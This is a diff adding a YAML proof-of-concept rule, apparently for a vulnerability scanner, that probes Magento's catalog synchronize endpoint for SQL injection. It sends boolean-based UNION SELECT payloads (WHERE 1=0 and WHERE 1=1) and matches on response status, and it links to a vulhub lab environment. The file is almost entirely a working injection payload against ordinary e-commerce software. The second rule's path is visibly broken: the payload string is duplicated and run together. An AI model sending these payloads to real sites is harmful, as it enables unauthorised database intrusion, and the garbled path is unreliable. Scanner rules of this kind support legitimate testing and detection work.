@@ -1,0 +1,26 @@
+name: poc-yaml-magento-sqli
+rules:
+  - method: GET
+    path: >-
+      /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
+    headers:
+      User-Agent: >-
+        Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
+        Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0
+    follow_redirects: false
+    expression: |
+      response.status == 200
+  - method: GET
+    path: >-
+      /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-
+    headers:
+      User-Agent: >-
+        Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
+        Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0
+    follow_redirects: false
+    expression: |
+      response.status == 400
+detail:
+  author: lnk23y
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli
